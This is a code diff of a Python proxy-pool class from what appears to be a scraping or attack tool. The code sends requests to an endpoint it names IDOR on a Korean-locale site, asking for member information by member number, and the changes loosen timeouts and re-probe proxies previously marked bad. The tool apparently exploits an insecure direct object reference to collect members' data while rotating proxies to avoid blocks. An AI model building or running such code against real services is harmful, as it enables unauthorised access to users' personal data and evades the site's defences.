@@ -370,7 +370,7 @@ class ProxyPool:
                 IDOR,
                 data={"bld": "dbms/MDC/DATA/mbr_add_info_select", "locale": "ko_KR", "mbrNo": str(KNOWN_MBR)},
                 headers={"Referer": BASE + "/contents/MDC/MAIN/main/index.cmd"},
-                timeout=6,
+                timeout=12,
             )
             if is_proxy_auth_fail(text=r.text) or r.status_code == 407:
                 return False
@@ -493,9 +493,11 @@ class ProxyPool:
         now = time.time()
         to_probe: list[str] = []
         for p in wanted:
-            if p in self.static_set or p in self.bad:
+            if p in self.static_set:
                 continue
-            if now - self.static_tried.get(p, 0) < 60:
+            self.bad.discard(p)
+            last = self.static_tried.get(p)
+            if last is not None and now - last < 60:
                 continue
             to_probe.append(p)
         if not to_probe:
